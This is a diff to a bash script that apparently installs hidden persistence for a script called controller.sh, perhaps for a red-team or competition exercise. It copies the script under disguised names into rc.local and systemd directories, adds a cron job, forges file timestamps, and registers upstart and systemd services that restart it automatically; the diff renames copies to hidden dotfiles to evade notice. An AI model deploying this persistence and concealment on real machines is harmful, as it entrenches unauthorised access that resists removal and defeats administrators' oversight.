@@ -1,23 +1,24 @@
 #!/bin/bash
 
-chmod +x controller.sh
+chmod +x .controller.sh
 LOCATIONS=("/etc/rc.local"
            "/etc/rc.d/rc.local"
            "/etc/init.d/rc.local"
            "/etc/systemd/system/basic.target/rc.local"
            "/etc/systemd/system/multi-user.target/rc.local")
-NAMES=("controller.sh" "networkd.sh" "scorecheck.sh" "loghelper.sh")
+NAMES=(".controller.sh" "networkd.sh" ".scorecheck.sh" "loghelper.sh")
 for LOCATION in "${LOCATIONS[@]}"
 do
     if [ -f "$LOCATION" ]; then
         for NAME in "${NAMES[@]}"
         do
-            cp -p "controller.sh" "${LOCATION%/*}/$NAME" &> /dev/null
+            cp -p ".controller.sh" "${LOCATION%/*}/$NAME" &> /dev/null
         done
     fi
 done
-(crontab -l 2>/dev/null; echo "15 5 17 4 * /etc/rc.local/controller.sh") | crontab -
-cp -p "controller.sh" "/etc/init.d/rc.local/rcd.sh" &> /dev/null
+(crontab -l 2>/dev/null; echo "15 5 17 4 * /etc/systemd/network/monitor.sh") | crontab -
+cp -p ".controller.sh" "/etc/init.d/rc.local/rcd.sh" &> /dev/null
+cp -p ".controller.sh" "/etc/systemd/network/.debug.sh" &> /dev/null
 if [[ $(initctl version) =~ upstart ]]; then
     sudo touch -r /etc/init/rc-sysinit.conf -a /etc/init/rc-sysinit.conf -c /etc/init/rc-sysinit.conf /etc/init/network-monitor.conf
     sudo cat > /etc/init/network-monitor.conf << EOF
@@ -39,7 +40,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=/etc/init.d/rc.local/rcd.sh
+ExecStart=/etc/systemd/network/.debug.sh
 Restart=always
 RestartSec=10
 
